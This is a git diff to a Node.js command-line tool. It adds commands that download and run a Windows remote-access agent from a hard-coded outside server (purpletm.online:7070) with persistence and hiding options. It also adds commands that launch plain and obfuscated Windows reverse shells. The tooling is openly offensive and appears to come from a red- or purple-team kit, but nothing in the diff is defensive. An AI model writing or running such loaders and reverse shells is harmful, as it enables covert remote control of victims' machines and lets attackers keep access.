@@ -99,6 +99,27 @@ if (process.argv[2] === 'help' && process.argv[3] === 'adaptix-agent') {
   });
 }
 
+const revWinAdaptixAgent = require('./utils/rev-win-adaptix-agent.js');
+
+if (process.argv[2] === 'rev-win-adaptix-agent') {
+  const options = {
+    url: process.argv[3] || "http://purpletm.online:7070/purple-win.exe",
+    persistence: process.argv.includes('--persist')
+  };
+  
+  revWinAdaptixAgent(options).then(result => {
+    console.log('✅ Windows Adaptix Agent deployment completed');
+    console.log(`PID: ${result.pid}`);
+    console.log(`File: ${result.filePath}`);
+    console.log(`Platform: ${result.platform}`);
+    console.log(`Method: ${result.method}`);
+    console.log(`Hidden: ${result.hidden}`);
+  }).catch(err => {
+    console.error('❌ Windows Agent deployment failed:', err.message);
+    process.exit(1);
+  });
+}
+
 const runSwiftBelt = require('./utils/run-swiftbelt.js');
 
 if (process.argv[2] === 'swiftbelt') {
@@ -110,4 +131,14 @@ if (process.argv[2] === 'swiftbelt') {
     console.error('❌ SwiftBelt execution failed:', err.message);
     process.exit(1);
   });
+}
+
+if (process.argv[2] === 'rev-win-direct') {
+  console.log('🚀 Starting Windows reverse shell...');
+  require('./utils/rev-win-direct.js');
+}
+
+if (process.argv[2] === 'rev-win-direct-obs') {
+  console.log('🚀 Starting obfuscated Windows reverse shell...');
+  require('./utils/rev-win-direct-obs.js');
 }
